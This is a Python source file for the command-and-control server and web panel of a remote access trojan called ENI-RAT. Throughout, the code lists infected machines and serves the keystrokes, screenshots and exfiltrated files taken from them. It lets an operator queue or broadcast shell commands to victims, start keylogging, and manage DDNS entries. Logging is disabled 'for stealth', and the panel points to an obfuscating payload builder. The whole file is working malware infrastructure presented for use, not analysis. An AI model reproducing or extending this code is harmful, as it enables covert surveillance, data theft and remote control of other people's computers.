#!/usr/bin/env python3
"""
ENI-RAT REST API + Web Panel
Serves the GUI backend and web dashboard
"""

import asyncio
import json
import sqlite3
import time
import os
import base64
from pathlib import Path
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, unquote_plus

DB_PATH = "server/rat.db"

CORS_HEADERS = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type, Authorization",
}

class APIHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # suppress logs for stealth

    def _send_json(self, data, status=200):
        body = json.dumps(data, indent=2, default=str).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        for k, v in CORS_HEADERS.items():
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _send_html(self, html, status=200):
        body = html.encode()
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_body(self) -> dict:
        length = int(self.headers.get("Content-Length", 0))
        if length > 0:
            raw = self.rfile.read(length)
            try:
                return json.loads(raw)
            except:
                return {"raw": raw.decode()}
        return {}

    def _get_db(self):
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        return conn

    def do_OPTIONS(self):
        self.send_response(204)
        for k, v in CORS_HEADERS.items():
            self.send_header(k, v)
        self.end_headers()

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/")
        params = parse_qs(parsed.query)

        # ─── Web Dashboard ─────────────────────────────────────────────
        if path == "" or path == "/":
            return self._send_html(DASHBOARD_HTML)

        elif path == "/api/agents":
            conn = self._get_db()
            status = params.get("status", [None])[0]
            if status:
                rows = conn.execute("SELECT * FROM agents WHERE status=? ORDER BY last_seen DESC", (status,)).fetchall()
            else:
                rows = conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
            agents = [dict(r) for r in rows]
            # Convert binary blobs to string for JSON
            for a in agents:
                for k, v in a.items():
                    if isinstance(v, bytes):
                        a[k] = base64.b64encode(v).decode()
            conn.close()
            return self._send_json({"agents": agents})

        elif path.startswith("/api/agents/"):
            agent_id = path.split("/api/agents/")[1].split("/")[0]
            conn = self._get_db()
            row = conn.execute("SELECT * FROM agents WHERE agent_id=?", (agent_id,)).fetchone()
            if not row:
                conn.close()
                return self._send_json({"error": "agent not found"}, 404)
            agent = dict(row)
            # Get tasks
            tasks = conn.execute("SELECT * FROM tasks WHERE agent_id=? ORDER BY created_at DESC LIMIT 50", (agent_id,)).fetchall()
            agent["tasks"] = [dict(t) for t in tasks]
            # Get keystrokes
            keys = conn.execute("SELECT * FROM keystrokes WHERE agent_id=? ORDER BY captured_at DESC LIMIT 100", (agent_id,)).fetchall()
            agent["keystrokes"] = [dict(k) for k in keys]
            # Get screenshots
            shots = conn.execute("SELECT * FROM screenshots WHERE agent_id=? ORDER BY captured_at DESC LIMIT 20", (agent_id,)).fetchall()
            agent["screenshots"] = [dict(s) for s in shots]
            # Get exfiltrated files
            files = conn.execute("SELECT id, agent_id, file_name, file_path, file_size, captured_at FROM exfiltrated WHERE agent_id=? ORDER BY captured_at DESC LIMIT 20", (agent_id,)).fetchall()
            agent["exfiltrated"] = [dict(f) for f in files]
            conn.close()
            return self._send_json({"agent": agent})

        elif path == "/api/ddns":
            conn = self._get_db()
            rows = conn.execute("SELECT * FROM ddns ORDER BY last_updated DESC").fetchall()
            entries = [dict(r) for r in rows]
            conn.close()
            return self._send_json({"ddns": entries})

        elif path.startswith("/api/ddns/resolve/"):
            hostname = path.split("/api/ddns/resolve/")[1]
            conn = self._get_db()
            row = conn.execute("SELECT current_ip FROM ddns WHERE hostname=?", (hostname,)).fetchone()
            conn.close()
            if row:
                return self._send_json({"hostname": hostname, "ip": row["current_ip"]})
            return self._send_json({"error": "hostname not found"}, 404)

        elif path == "/api/tasks/all":
            conn = self._get_db()
            rows = conn.execute("SELECT * FROM tasks ORDER BY created_at DESC LIMIT 100").fetchall()
            tasks = [dict(r) for r in rows]
            conn.close()
            return self._send_json({"tasks": tasks})

        elif path.startswith("/api/exfiltrate/"):
            file_id = path.split("/api/exfiltrate/")[1]
            conn = self._get_db()
            row = conn.execute("SELECT * FROM exfiltrated WHERE id=?", (file_id,)).fetchone()
            conn.close()
            if row:
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Disposition", f'attachment; filename="{row["file_name"]}"')
                self.send_header("Content-Length", str(len(row["content"])))
                self.end_headers()
                self.wfile.write(row["content"])
                return
            return self._send_json({"error": "file not found"}, 404)

        elif path.startswith("/api/screenshot/"):
            shot_id = path.split("/api/screenshot/")[1]
            conn = self._get_db()
            row = conn.execute("SELECT * FROM screenshots WHERE id=?", (shot_id,)).fetchone()
            conn.close()
            if row and os.path.exists(row["image_path"]):
                with open(row["image_path"], "rb") as f:
                    img = f.read()
                self.send_response(200)
                self.send_header("Content-Type", "image/png")
                self.send_header("Content-Length", str(len(img)))
                self.end_headers()
                self.wfile.write(img)
                return
            return self._send_json({"error": "screenshot not found"}, 404)

        elif path == "/api/stats":
            conn = self._get_db()
            total_agents = conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
            active_agents = conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0]
            total_tasks = conn.execute("SELECT COUNT(*) FROM tasks").fetchone()[0]
            total_keys = conn.execute("SELECT COUNT(*) FROM keystrokes").fetchone()[0]
            total_screenshots = conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0]
            total_files = conn.execute("SELECT COUNT(*) FROM exfiltrated").fetchone()[0]
            ddns_count = conn.execute("SELECT COUNT(*) FROM ddns").fetchone()[0]
            conn.close()
            return self._send_json({
                "total_agents": total_agents,
                "active_agents": active_agents,
                "total_tasks": total_tasks,
                "total_keystrokes": total_keys,
                "total_screenshots": total_screenshots,
                "total_exfiltrated": total_files,
                "ddns_entries": ddns_count,
            })

        else:
            return self._send_json({"error": "not found"}, 404)

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path.rstrip("/")
        body = self._read_body()

        if path == "/api/tasks/create":
            agent_id = body.get("agent_id")
            command = body.get("command")
            args = body.get("args", "")
            if not agent_id or not command:
                return self._send_json({"error": "agent_id and command required"}, 400)
            conn = self._get_db()
            task_id = str(int(time.time() * 1000000))
            conn.execute("INSERT INTO tasks (task_id, agent_id, command, args, status, created_at) VALUES (?,?,?,?,?,?)",
                        (task_id, agent_id, command, args, "pending", time.time()))
            conn.commit()
            conn.close()
            return self._send_json({"task_id": task_id, "status": "pending"})

        elif path == "/api/broadcast":
            command = body.get("command")
            args = body.get("args", "")
            if not command:
                return self._send_json({"error": "command required"}, 400)
            conn = self._get_db()
            active = conn.execute("SELECT agent_id FROM agents WHERE status='active'").fetchall()
            count = 0
            for row in active:
                agent_id = row["agent_id"]
                task_id = str(int(time.time() * 1000000)) + str(count)
                conn.execute("INSERT INTO tasks (task_id, agent_id, command, args, status, created_at) VALUES (?,?,?,?,?,?)",
                            (task_id, agent_id, command, args, "pending", time.time()))
                count += 1
            conn.commit()
            conn.close()
            return self._send_json({"broadcast_to": count, "command": command})

        elif path == "/api/agents/delete":
            agent_id = body.get("agent_id")
            if not agent_id:
                return self._send_json({"error": "agent_id required"}, 400)
            conn = self._get_db()
            conn.execute("DELETE FROM agents WHERE agent_id=?", (agent_id,))
            conn.execute("DELETE FROM tasks WHERE agent_id=?", (agent_id,))
            conn.execute("DELETE FROM keystrokes WHERE agent_id=?", (agent_id,))
            conn.execute("DELETE FROM screenshots WHERE agent_id=?", (agent_id,))
            conn.execute("DELETE FROM exfiltrated WHERE agent_id=?", (agent_id,))
            conn.commit()
            conn.close()
            return self._send_json({"deleted": agent_id})

        elif path == "/api/ddns/register":
            hostname = body.get("hostname")
            ip = body.get("ip")
            if not hostname or not ip:
                return self._send_json({"error": "hostname and ip required"}, 400)
            conn = self._get_db()
            conn.execute("INSERT OR REPLACE INTO ddns (hostname, current_ip, last_updated) VALUES (?,?,?)",
                        (hostname, ip, time.time()))
            conn.commit()
            conn.close()
            return self._send_json({"hostname": hostname, "ip": ip, "status": "registered"})

        elif path == "/api/ddns/delete":
            hostname = body.get("hostname")
            if not hostname:
                return self._send_json({"error": "hostname required"}, 400)
            conn = self._get_db()
            conn.execute("DELETE FROM ddns WHERE hostname=?", (hostname,))
            conn.commit()
            conn.close()
            return self._send_json({"deleted": hostname})

        elif path == "/api/agent/note":
            agent_id = body.get("agent_id")
            note = body.get("note", "")
            if not agent_id:
                return self._send_json({"error": "agent_id required"}, 400)
            conn = self._get_db()
            conn.execute("UPDATE agents SET note=? WHERE agent_id=?", (note, agent_id))
            conn.commit()
            conn.close()
            return self._send_json({"updated": agent_id})

        else:
            return self._send_json({"error": "not found"}, 404)

    def do_DELETE(self):
        return self.do_POST({"action": "delete"})


def run_api_server(host="127.0.0.1", port=5000):
    print(f"[*] REST API / Web Panel running on http://{host}:{port}")
    server = HTTPServer((host, port), APIHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.shutdown()



# ─── EMBEDDED WEB DASHBOARD ────────────────────────────────────────────────
DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ENI-RAT C2 Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#0a0a0f;--surface:#12121a;--surface2:#1a1a2e;--border:#2a2a3e;--text:#e0e0e0;--text-dim:#8888aa;--accent:#ff6b9d;--accent2:#c084fc;--green:#34d399;--red:#ef4444;--orange:#f97316}
body{font-family:system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
.dashboard{display:grid;grid-template-columns:240px 1fr;min-height:100vh}
.sidebar{background:var(--surface);border-right:1px solid var(--border);padding:20px;position:sticky;top:0;height:100vh;overflow-y:auto}
.logo{font-size:1.3rem;font-weight:700;margin-bottom:30px;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.logo span{font-size:1.5rem}
.nav-item{display:flex;align-items:center;gap:10px;padding:10px 14px;border-radius:8px;cursor:pointer;transition:all 0.2s;margin-bottom:4px;color:var(--text-dim);font-size:0.9rem;user-select:none}
.nav-item:hover,.nav-item.active{background:var(--surface2);color:var(--text)}
.nav-item .icon{font-size:1.1rem}
.nav-item .badge{margin-left:auto;background:var(--accent);color:#fff;font-size:0.7rem;padding:2px 8px;border-radius:10px;font-weight:600}
.main{padding:24px}
.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
.header h1{font-size:1.5rem;font-weight:600}
.header .subtitle{color:var(--text-dim);font-size:0.85rem;margin-top:4px}
.stats-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:16px;margin-bottom:24px}
.stat-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:16px;transition:all 0.2s}
.stat-card:hover{border-color:var(--accent)}
.stat-card .stat-value{font-size:1.8rem;font-weight:700;margin-bottom:4px}
.stat-card .stat-label{color:var(--text-dim);font-size:0.75rem;text-transform:uppercase;letter-spacing:0.5px}
.table-container{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:20px}
.table-container .table-header{padding:16px 20px;border-bottom:1px solid var(--border);font-weight:600;display:flex;justify-content:space-between;align-items:center}
table{width:100%;border-collapse:collapse}
th{text-align:left;padding:12px 20px;font-size:0.75rem;text-transform:uppercase;letter-spacing:0.5px;color:var(--text-dim);border-bottom:1px solid var(--border);font-weight:600}
td{padding:12px 20px;font-size:0.85rem;border-bottom:1px solid var(--border)}
tr:hover td{background:rgba(255,107,157,0.03)}
tr:last-child td{border-bottom:none}
.status-badge{display:inline-flex;align-items:center;gap:6px;padding:4px 10px;border-radius:20px;font-size:0.75rem;font-weight:600}
.status-badge.active{background:rgba(52,211,153,0.15);color:var(--green)}
.status-badge.awaiting{background:rgba(249,115,22,0.15);color:var(--orange)}
.status-badge.dead{background:rgba(239,68,68,0.15);color:var(--red)}
.dot{width:6px;height:6px;border-radius:50%;display:inline-block}
.dot.active{background:var(--green)}
.dot.awaiting{background:var(--orange)}
.dot.dead{background:var(--red)}
.action-btn{padding:6px 12px;border:1px solid var(--border);background:var(--surface2);color:var(--text);border-radius:6px;cursor:pointer;font-size:0.75rem;transition:all 0.2s}
.action-btn:hover{border-color:var(--accent);background:rgba(255,107,157,0.1)}
.action-btn.danger:hover{border-color:var(--red);background:rgba(239,68,68,0.1)}
.panel{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:20px;margin-bottom:20px}
.panel h3{margin-bottom:16px;font-size:1rem}
.detail-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px}
.detail-item label{display:block;color:var(--text-dim);font-size:0.75rem;margin-bottom:4px}
.detail-item span{font-size:0.9rem;font-weight:500}
.command-bar{display:flex;gap:8px;margin-top:16px}
.command-input{flex:1;background:var(--surface2);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:0.85rem}
.command-input:focus{outline:none;border-color:var(--accent)}
.send-btn{padding:10px 20px;background:var(--accent);color:#fff;border:none;border-radius:8px;cursor:pointer;font-weight:600;transition:all 0.2s}
.send-btn:hover{filter:brightness(1.1)}
pre{background:var(--surface2);padding:16px;border-radius:8px;font-size:0.85rem;overflow-x:auto;font-family:monospace}
@media(max-width:768px){.dashboard{grid-template-columns:1fr}.sidebar{display:none}}
</style>
</head>
<body>
<div class="dashboard">
<nav class="sidebar">
<div class="logo"><span>&#9889;</span> ENI-RAT</div>
<div class="nav-item active" onclick="navTo('agents',this)"><span class="icon">&#128187;</span> Agents <span class="badge" id="agent-count">0</span></div>
<div class="nav-item" onclick="navTo('ddns',this)"><span class="icon">&#127758;</span> DDNS</div>
<div class="nav-item" onclick="navTo('tasks',this)"><span class="icon">&#128203;</span> Tasks</div>
<div class="nav-item" onclick="navTo('stats',this)"><span class="icon">&#128202;</span> Stats</div>
<div class="nav-item" onclick="navTo('builder',this)"><span class="icon">&#128295;</span> Builder</div>
<div style="margin-top:30px;font-size:0.75rem;color:var(--text-dim)"><p>ENI-RAT v1.0</p></div>
</nav>
<main class="main" id="main-content"></main>
</div>

<script>
var API = '';
var currentSection = '';

function apiFetch(path) {
    return fetch(API + path).then(function(r){return r.json();}).catch(function(e){return {error:e.message};});
}

function navTo(name, el) {
    var items = document.querySelectorAll('.nav-item');
    for (var i = 0; i < items.length; i++) items[i].classList.remove('active');
    el.classList.add('active');
    currentSection = name;
    if (name === 'agents') renderAgentsPage();
    else if (name === 'ddns') renderDDNSPage();
    else if (name === 'tasks') renderTasksPage();
    else if (name === 'stats') renderStatsPage();
    else if (name === 'builder') renderBuilderPage();
}

// ======= AGENTS =======
function renderAgentsPage() {
    var main = document.getElementById('main-content');
    main.innerHTML =
        '<div class="header"><div><h1>Dashboard</h1><div class="subtitle">Real-time agent overview</div></div><button class="action-btn" onclick="renderAgentsPage()">&#x21bb; Refresh</button></div>' +
        '<div class="stats-grid" id="stats-grid"></div>' +
        '<div class="table-container"><div class="table-header">&#128187; Connected Agents</div><table><thead><tr><th>Hostname</th><th>User</th><th>OS</th><th>IP</th><th>Status</th><th>Last Seen</th><th></th></tr></thead><tbody id="agents-tbody"><tr><td colspan="7" style="text-align:center;color:var(--text-dim);padding:30px;">Loading...</td></tr></tbody></table></div>';
    loadAgents();
}

function loadAgents() {
    apiFetch('/api/stats').then(function(s){
        var sg = document.getElementById('stats-grid');
        if (!sg) return;
        sg.innerHTML =
            '<div class="stat-card"><div class="stat-value">'+ (s.total_agents||0) +'</div><div class="stat-label">Total Agents</div></div>' +
            '<div class="stat-card"><div class="stat-value" style="color:var(--green)">'+ (s.active_agents||0) +'</div><div class="stat-label">Active Now</div></div>' +
            '<div class="stat-card"><div class="stat-value">'+ (s.total_tasks||0) +'</div><div class="stat-label">Tasks</div></div>' +
            '<div class="stat-card"><div class="stat-value">'+ (s.total_keystrokes||0) +'</div><div class="stat-label">Keystrokes</div></div>' +
            '<div class="stat-card"><div class="stat-value">'+ (s.total_screenshots||0) +'</div><div class="stat-label">Screenshots</div></div>' +
            '<div class="stat-card"><div class="stat-value">'+ (s.total_exfiltrated||0) +'</div><div class="stat-label">Files</div></div>';
        document.getElementById('agent-count').textContent = s.active_agents||0;
    });
    apiFetch('/api/agents').then(function(d){
        var tbody = document.getElementById('agents-tbody');
        if (!tbody) return;
        var agents = d.agents || [];
        if (!agents.length) {
            tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;color:var(--text-dim);padding:30px;">No agents connected. Deploy a payload!</td></tr>';
            return;
        }
        var h = '';
        for (var i = 0; i < agents.length; i++) {
            var a = agents[i];
            var s = a.status||'awaiting';
            var ls = a.last_seen ? new Date(a.last_seen*1000).toLocaleString() : 'never';
            var hn = a.hostname_tag || a.hostname || '?';
            var ip = a.public_ip || a.private_ip || '?';
            h += '<tr>' +
                '<td><strong>'+ hn +'</strong></td>' +
                '<td>'+ (a.username||'?') +'</td>' +
                '<td>'+ (a.os||'?') +' '+ (a.arch||'') +'</td>' +
                '<td style="font-size:0.8rem;">'+ ip +'</td>' +
                '<td><span class="status-badge '+ s +'"><span class="dot '+ s +'"></span>'+ s +'</span></td>' +
                '<td>'+ ls +'</td>' +
                '<td><button class="action-btn" onclick="showAgentDetail(\''+ a.agent_id +'\')">Detail</button> ' +
                '<button class="action-btn danger" onclick="delAgent(\''+ a.agent_id +'\')">X</button></td>' +
            '</tr>';
        }
        tbody.innerHTML = h;
    });
}

function showAgentDetail(id) {
    apiFetch('/api/agents/'+id).then(function(r){
        var a = r.agent;
        if (!a) return;
        var main = document.getElementById('main-content');
        var h = '<div class="header"><div><h1>Agent Detail</h1><div class="subtitle">'+ (a.hostname||'?') +'</div></div><button class="action-btn" onclick="renderAgentsPage()">&#x2190; Back</button></div>';
        h += '<div class="panel"><h3>System Info</h3><div class="detail-grid">';
        var fields = [
            ['Hostname',a.hostname],['User',a.username],['OS',a.os+' '+(a.os_version||'')],['Arch',a.arch],
            ['Public IP',a.public_ip],['Private IP',a.private_ip],['Status',a.status],
            ['First Seen',a.first_seen?new Date(a.first_seen*1000).toLocaleString():'?'],
            ['Last Seen',a.last_seen?new Date(a.last_seen*1000).toLocaleString():'?']
        ];
        for (var i = 0; i < fields.length; i++) {
            h += '<div class="detail-item"><label>'+ fields[i][0] +'</label><span>'+ (fields[i][1]||'-') +'</span></div>';
        }
        h += '</div><div class="command-bar">';
        h += '<input class="command-input" id="cmd-input" placeholder="shell calc, whoami, dir..." onkeydown="if(event.key==\'Enter\')sendCmd(\''+ id +'\')">';
        h += '<button class="send-btn" onclick="sendCmd(\''+ id +'\')">Send</button>';
        h += '</div>';
        h += '<div style="margin-top:10px;display:flex;gap:6px;flex-wrap:wrap;">';
        h += '<button class="action-btn" onclick="quickCmd(\''+id+'\',\'screenshot\')">&#128247; Screenshot</button>';
        h += '<button class="action-btn" onclick="quickCmd(\''+id+'\',\'info\')">&#8505; Info</button>';
        h += '<button class="action-btn" onclick="quickCmd(\''+id+'\',\'shell\',\'whoami\')">&#9000; whoami</button>';
        h += '<button class="action-btn" onclick="quickCmd(\''+id+'\',\'shell\',\'tasklist\')">&#9776; tasklist</button>';
        h += '<button class="action-btn" onclick="quickCmd(\''+id+'\',\'keylog_start\')">&#9000; Keylog</button>';
        h += '</div></div>';

        if (a.tasks && a.tasks.length) {
            h += '<div class="table-container"><div class="table-header">Tasks</div><table><thead><tr><th>Cmd</th><th>Args</th><th>Status</th><th>Result</th></tr></thead><tbody>';
            var tasks = a.tasks.slice(0,10);
            for (var j = 0; j < tasks.length; j++) {
                var t = tasks[j];
                h += '<tr><td>'+ (t.command||'') +'</td><td>'+ (t.args||'') +'</td><td>'+ (t.status||'') +'</td><td style="max-width:300px;overflow:hidden;font-size:0.75rem;">'+ (t.result||'') +'</td></tr>';
            }
            h += '</tbody></table></div>';
        }
        if (a.screenshots && a.screenshots.length) {
            h += '<div class="panel"><h3>Screenshots</h3><div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;">';
            var shots = a.screenshots.slice(0,6);
            for (var k = 0; k < shots.length; k++) {
                h += '<a href="/api/screenshot/'+ shots[k].id +'" target="_blank"><img src="/api/screenshot/'+ shots[k].id +'" style="width:100%;border-radius:8px;border:1px solid var(--border)"></a>';
            }
            h += '</div></div>';
        }
        main.innerHTML = h;
    });
}

function sendCmd(agentId) {
    var inp = document.getElementById('cmd-input');
    if (!inp) return;
    var cmd = inp.value.trim();
    if (!cmd) return;
    inp.value = '';
    var p = cmd.split(' ');
    var command = p[0];
    var args = p.slice(1).join(' ');
    fetch('/api/tasks/create', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({agent_id: agentId, command: command, args: args})
    });
    setTimeout(function(){ showAgentDetail(agentId); }, 1500);
}

function quickCmd(agentId, command, args) {
    args = args || '';
    fetch('/api/tasks/create', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({agent_id: agentId, command: command, args: args})
    });
    setTimeout(function(){ showAgentDetail(agentId); }, 1500);
}

function delAgent(id) {
    if (confirm('Delete this agent?')) {
        fetch('/api/agents/delete', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({agent_id:id})});
        setTimeout(loadAgents, 500);
    }
}

// ======= DDNS =======
function renderDDNSPage() {
    var main = document.getElementById('main-content');
    main.innerHTML = '<div class="header"><div><h1>DDNS</h1><div class="subtitle">Custom dynamic DNS</div></div><button class="action-btn" onclick="loadDDNS()">Refresh</button></div><div class="table-container"><div class="table-header">Entries</div><table><thead><tr><th>Hostname</th><th>IP</th><th>Owner</th><th>Updated</th></tr></thead><tbody id="ddns-tbody"><tr><td colspan="4" style="text-align:center;color:var(--text-dim);padding:30px;">Loading...</td></tr></tbody></table></div>';
    loadDDNS();
}

function loadDDNS() {
    apiFetch('/api/ddns').then(function(d){
        var tbody = document.getElementById('ddns-tbody');
        if (!tbody) return;
        var entries = d.ddns || [];
        if (!entries.length) {
            tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;color:var(--text-dim);padding:30px;">No entries</td></tr>';
            return;
        }
        var h = '';
        for (var i = 0; i < entries.length; i++) {
            var e = entries[i];
            h += '<tr><td><strong>'+ e.hostname +'.eni</strong></td><td style="font-family:monospace;color:var(--green)">'+ e.current_ip +'</td><td>'+ (e.owner_agent||'').substring(0,12) +'</td><td>'+ (e.last_updated ? new Date(e.last_updated*1000).toLocaleString() : '?') +'</td></tr>';
        }
        tbody.innerHTML = h;
    });
}

// ======= TASKS =======
function renderTasksPage() {
    var main = document.getElementById('main-content');
    main.innerHTML = '<div class="header"><div><h1>Tasks</h1><div class="subtitle">Command history</div></div><button class="action-btn" onclick="loadTasks()">Refresh</button></div><div class="table-container"><div class="table-header">Recent Tasks</div><table><thead><tr><th>Time</th><th>Agent</th><th>Command</th><th>Args</th><th>Status</th><th>Result</th></tr></thead><tbody id="tasks-tbody"><tr><td colspan="6" style="text-align:center;color:var(--text-dim);padding:30px;">Loading...</td></tr></tbody></table></div>';
    loadTasks();
}

function loadTasks() {
    apiFetch('/api/tasks/all').then(function(d){
        var tbody = document.getElementById('tasks-tbody');
        if (!tbody) return;
        var tasks = d.tasks || [];
        if (!tasks.length) {
            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--text-dim);padding:30px;">No tasks yet</td></tr>';
            return;
        }
        var h = '';
        for (var i = 0; i < tasks.length; i++) {
            var t = tasks[i];
            h += '<tr><td>'+ new Date((t.created_at||0)*1000).toLocaleString() +'</td><td>'+ (t.agent_id||'').substring(0,8) +'</td><td style="font-family:monospace">'+ (t.command||'') +'</td><td>'+ (t.args||'') +'</td><td>'+ (t.status||'') +'</td><td style="max-width:200px;overflow:hidden;font-size:0.75rem;">'+ (t.result||'') +'</td></tr>';
        }
        tbody.innerHTML = h;
    });
}

// ======= STATS =======
function renderStatsPage() {
    var main = document.getElementById('main-content');
    main.innerHTML = '<div class="header"><div><h1>Statistics</h1><div class="subtitle">C2 overview</div></div><button class="action-btn" onclick="loadBigStats()">Refresh</button></div><div class="stats-grid" id="big-stats"></div>';
    loadBigStats();
}

function loadBigStats() {
    apiFetch('/api/stats').then(function(s){
        var sg = document.getElementById('big-stats');
        if (!sg) return;
        var items = [
            ['Total Agents', s.total_agents||0, 'var(--accent)'],
            ['Active Agents', s.active_agents||0, 'var(--green)'],
            ['Total Tasks', s.total_tasks||0, 'var(--accent2)'],
            ['Keystrokes', s.total_keystrokes||0, 'var(--orange)'],
            ['Screenshots', s.total_screenshots||0, 'var(--accent)'],
            ['Files Exfiltrated', s.total_exfiltrated||0, 'var(--green)'],
            ['DDNS Entries', s.ddns_entries||0, 'var(--accent2)']
        ];
        var h = '';
        for (var i = 0; i < items.length; i++) {
            h += '<div class="stat-card"><div class="stat-value" style="color:'+ items[i][2] +'">'+ items[i][1] +'</div><div class="stat-label">'+ items[i][0] +'</div></div>';
        }
        sg.innerHTML = h;
    });
}

// ======= BUILDER =======
function renderBuilderPage() {
    var main = document.getElementById('main-content');
    main.innerHTML =
        '<div class="header"><div><h1>Builder</h1><div class="subtitle">Payload builder</div></div></div>' +
        '<div class="panel"><h3>CLI Builder</h3>' +
        '<pre>python3 builder/builder.py --host YOUR_IP --compile --obfuscate</pre>' +
        '<p style="margin-top:12px;color:var(--text-dim);">Use <code>python3 gui/rat_gui.py</code> for the interactive GUI builder with all options.</p>' +
        '<p style="margin-top:4px;color:var(--text-dim);">Running: WS='+ window.location.hostname +':8443, API=:'+ window.location.port +'</p></div>';
}

// ======= AUTO-REFRESH =======
var _autoTimer = setInterval(function(){
    if (currentSection === 'agents') loadAgents();
    else if (currentSection === 'ddns') loadDDNS();
    else if (currentSection === 'tasks') loadTasks();
    else if (currentSection === 'stats') loadBigStats();
}, 10000);

// Start
renderAgentsPage();
</script>
</body>
</html>
"""

if __name__ == "__main__":
    run_api_server()
